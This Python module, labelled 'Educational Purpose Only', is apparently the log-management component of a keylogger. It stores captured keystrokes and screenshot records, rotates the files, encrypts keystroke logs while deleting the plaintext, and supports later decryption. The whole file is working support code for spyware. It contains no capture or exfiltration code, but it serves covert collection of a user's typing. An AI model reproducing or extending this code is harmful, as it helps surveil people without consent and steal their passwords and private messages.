"""
Log Manager Module
Educational Purpose Only - Use Responsibly

This module handles log file management, rotation, and encryption.
"""

import os
import logging
import threading
from datetime import datetime
from pathlib import Path

class LogManager:
    """Manages log files, rotation, and encryption."""
    
    def __init__(self, config, encryption_manager):
        self.config = config
        self.encryption = encryption_manager
        self.logger = logging.getLogger(__name__)
        self.lock = threading.Lock()
        
        # Configuration
        self.log_directory = Path(config.get('GENERAL', 'log_directory', 'logs'))
        self.keystroke_dir = self.log_directory / 'keystrokes'
        self.screenshot_dir = self.log_directory / 'screenshots'
        self.system_dir = self.log_directory / 'system'
        
        # Log rotation settings
        self.max_log_size = self._parse_size(
            config.get('KEYLOGGER', 'log_rotation_size', '10MB')
        )
        self.max_logs = config.getint('KEYLOGGER', 'max_log_files', 10)
        
        # Create directories
        self._create_directories()
        
        # Current log files
        self.current_keystroke_file = None
        self.current_screenshot_log = None
        
    def _create_directories(self):
        """Create necessary directories."""
        try:
            self.keystroke_dir.mkdir(parents=True, exist_ok=True)
            self.screenshot_dir.mkdir(parents=True, exist_ok=True)
            self.system_dir.mkdir(parents=True, exist_ok=True)
            self.logger.info("Log directories created successfully")
        except Exception as e:
            self.logger.error(f"Error creating directories: {e}")
            raise
    
    def log_keystroke(self, log_entry):
        """Log a keystroke entry."""
        try:
            with self.lock:
                # Get or create current log file
                log_file = self._get_current_keystroke_file()
                
                # Check if rotation is needed
                if self._should_rotate_log(log_file):
                    self._rotate_keystroke_logs()
                    log_file = self._get_current_keystroke_file()
                
                # Write log entry
                self._write_log_entry(log_file, log_entry)
                
        except Exception as e:
            self.logger.error(f"Error logging keystroke: {e}")
    
    def log_screenshot(self, screenshot_path, metadata=None):
        """Log a screenshot capture."""
        try:
            with self.lock:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                # Create log entry
                log_entry = f"{timestamp} | Screenshot: {screenshot_path}"
                if metadata:
                    log_entry += f" | Metadata: {metadata}"
                
                # Write to screenshot log
                screenshot_log = self.system_dir / 'screenshots.log'
                self._write_log_entry(screenshot_log, log_entry)
                
        except Exception as e:
            self.logger.error(f"Error logging screenshot: {e}")
    
    def log_system_event(self, event_type, message):
        """Log a system event."""
        try:
            with self.lock:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_entry = f"{timestamp} | {event_type} | {message}"
                
                # Write to system log
                system_log = self.system_dir / 'system.log'
                self._write_log_entry(system_log, log_entry)
                
        except Exception as e:
            self.logger.error(f"Error logging system event: {e}")
    
    def _get_current_keystroke_file(self):
        """Get the current keystroke log file."""
        if self.current_keystroke_file is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"keystrokes_{timestamp}.log"
            self.current_keystroke_file = self.keystroke_dir / filename
        
        return self.current_keystroke_file
    
    def _should_rotate_log(self, log_file):
        """Check if log rotation is needed."""
        try:
            if not log_file.exists():
                return False
            
            file_size = log_file.stat().st_size
            return file_size >= self.max_log_size
            
        except Exception as e:
            self.logger.error(f"Error checking log rotation: {e}")
            return False
    
    def _rotate_keystroke_logs(self):
        """Rotate keystroke log files."""
        try:
            # Encrypt current log file if encryption is enabled
            if self.current_keystroke_file and self.current_keystroke_file.exists():
                if self.config.getboolean('ENCRYPTION', 'enabled', fallback=True):
                    self._encrypt_log_file(self.current_keystroke_file)
            
            # Reset current log file
            self.current_keystroke_file = None
            
            # Clean up old log files
            self._cleanup_old_logs()
            
            self.logger.info("Log rotation completed")
            
        except Exception as e:
            self.logger.error(f"Error rotating logs: {e}")
    
    def _encrypt_log_file(self, log_file):
        """Encrypt a log file."""
        try:
            # Read file content
            with open(log_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Encrypt content
            encrypted_content = self.encryption.encrypt_data(content)
            
            # Write encrypted content to .enc file
            encrypted_file = log_file.with_suffix('.log.enc')
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted_content)
            
            # Remove original file
            log_file.unlink()
            
            self.logger.info(f"Log file encrypted: {encrypted_file}")
            
        except Exception as e:
            self.logger.error(f"Error encrypting log file: {e}")
    
    def _cleanup_old_logs(self):
        """Clean up old log files."""
        try:
            # Get all log files (both .log and .log.enc)
            log_files = list(self.keystroke_dir.glob('keystrokes_*.log*'))
            
            # Sort by modification time (oldest first)
            log_files.sort(key=lambda x: x.stat().st_mtime)
            
            # Remove excess files
            while len(log_files) > self.max_logs:
                old_file = log_files.pop(0)
                old_file.unlink()
                self.logger.info(f"Removed old log file: {old_file}")
                
        except Exception as e:
            self.logger.error(f"Error cleaning up old logs: {e}")
    
    def _write_log_entry(self, log_file, entry):
        """Write a log entry to file."""
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(entry + '\n')
                f.flush()  # Ensure data is written immediately
                
        except Exception as e:
            self.logger.error(f"Error writing log entry: {e}")
    
    def _parse_size(self, size_str):
        """Parse size string (e.g., '10MB') to bytes."""
        try:
            size_str = size_str.upper().strip()
            
            if size_str.endswith('KB'):
                return int(size_str[:-2]) * 1024
            elif size_str.endswith('MB'):
                return int(size_str[:-2]) * 1024 * 1024
            elif size_str.endswith('GB'):
                return int(size_str[:-2]) * 1024 * 1024 * 1024
            else:
                return int(size_str)  # Assume bytes
                
        except Exception as e:
            self.logger.error(f"Error parsing size string '{size_str}': {e}")
            return 10 * 1024 * 1024  # Default to 10MB
    
    def get_log_files(self, log_type='keystrokes'):
        """Get list of log files."""
        try:
            if log_type == 'keystrokes':
                directory = self.keystroke_dir
                pattern = 'keystrokes_*.log*'
            elif log_type == 'screenshots':
                directory = self.screenshot_dir
                pattern = '*.png'
            elif log_type == 'system':
                directory = self.system_dir
                pattern = '*.log'
            else:
                return []
            
            files = list(directory.glob(pattern))
            files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
            
            return files
            
        except Exception as e:
            self.logger.error(f"Error getting log files: {e}")
            return []
    
    def decrypt_log_file(self, encrypted_file):
        """Decrypt an encrypted log file."""
        try:
            if not encrypted_file.suffix == '.enc':
                raise ValueError("File is not encrypted")
            
            # Read encrypted content
            with open(encrypted_file, 'rb') as f:
                encrypted_content = f.read()
            
            # Decrypt content
            decrypted_content = self.encryption.decrypt_data(encrypted_content)
            
            return decrypted_content
            
        except Exception as e:
            self.logger.error(f"Error decrypting log file: {e}")
            return None
    
    def get_log_statistics(self):
        """Get statistics about log files."""
        try:
            stats = {
                'keystroke_files': len(self.get_log_files('keystrokes')),
                'screenshot_files': len(self.get_log_files('screenshots')),
                'system_files': len(self.get_log_files('system')),
                'total_size': 0
            }
            
            # Calculate total size
            for directory in [self.keystroke_dir, self.screenshot_dir, self.system_dir]:
                for file_path in directory.rglob('*'):
                    if file_path.is_file():
                        stats['total_size'] += file_path.stat().st_size
            
            return stats
            
        except Exception as e:
            self.logger.error(f"Error getting log statistics: {e}")
            return {}

